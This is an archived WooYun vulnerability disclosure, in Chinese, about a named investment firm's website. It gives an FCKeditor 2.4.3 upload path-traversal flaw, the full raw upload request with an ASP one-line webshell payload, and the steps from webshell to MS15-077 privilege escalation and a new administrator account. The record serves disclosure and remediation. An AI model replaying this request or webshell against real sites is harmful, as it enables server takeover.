{"id": 68730, "wybug_id": "wooyun-2015-0140941", "wybug_title": "兰馨亚洲投资集团网站存在多个漏洞可上传webshell并提权", "wybug_corp": "兰馨亚洲投资集团", "wybug_author": "drunkdream", "wybug_date": "2015-09-13 20:19", "wybug_open_date": "2015-10-28 20:20", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["提权"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-13：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-10-28：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 1、网站配置问题导致可获取目录文件列表2、使用的第三方库版本较低，可以直接上传webshell3、服务器没有及时更新补丁，可以直接提权 详细说明：  1、网站配置问题导致可获取目录文件列表\n\n2、网站使用的fckeditor版本为：2.4.3\n\n   在http://www.orchidasia.com/fckeditor/editor/filemanager/browser/default/browser.html?%20Type=../&Connector=connectors/aspx/connector.aspx页面可以直接上传.aspx和.asp文件\n\n   但是上传后访问会提示403错误\n\n   说明该网站对文件上传目录做了特殊处理，必须要将文件上传到具有执行权限的目录才行。   通过fiddler抓包获得上传的HTTP请求包为：POST /fckeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=FileUpload&Type=File&CurrentFolder=%2F HTTP/1.1Host: www.orchidasia.comConnection: keep-aliveContent-Length: 228Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://www.orchidasia.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36 SE 2.X MetaSr 1.0Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxrI14s0syIXGIpxxDNT: 1Referer: http://www.orchidasia.com/fckeditor/editor/filemanager/browser/default/frmupload.htmlAccept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8------WebKitFormBoundaryxrI14s0syIXGIpxxContent-Disposition: form-data; name=\"NewFile\"; filename=\"eva.asa\"Content-Type: application/octet-stream<%execute request(\"evileva\")%>------WebKitFormBoundaryxrI14s0syIXGIpxx--该请求中的CurrentFolder参数表示要上传到的目录，而2.4.3版本的fckeditor没有检查该参数，导致可以指定任意目录。例如将该参数设为：“%2F..%2F..%2F..%2F”，就可以在网站根目录写入文件。    一开始写入的是asp文件，上传接口返回成功，并返回了文件名，但是直接访问后提示404错误。\n\n    以为是文件写入失败，但是将后缀换成“txt”后上传是可以访问的，说明上传接口本身没有问题，应该还是iis配置的问题。接着，把后缀改为“aspx”上传，发现不再报错。    于是，上传aspx一句话木马后，使用菜刀连接成功。\n\n3、webshell中执行命令行的权限较低\n\n    但是，可以使用MS15-077漏洞进行提权，将exp程序上传到服务器上\n\n   漏洞证明：  执行ipconfig /all 命令\n\n执行net user命令\n\n执行systeminfo命令\n\n使用exp程序添加管理员账户\n\n显示新添加的账户信息\n\n说明可以创建Administrator权限的账户   修复方案：  1、不允许列取目录文件列表2、使用最新版本的fckeditor3、安装Windows补丁exp程序和aspx木马文件已删除不过，该网站已被写入多个后门，希望管理员进行彻底杀毒   版权声明：转载请注明来源 drunkdream@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}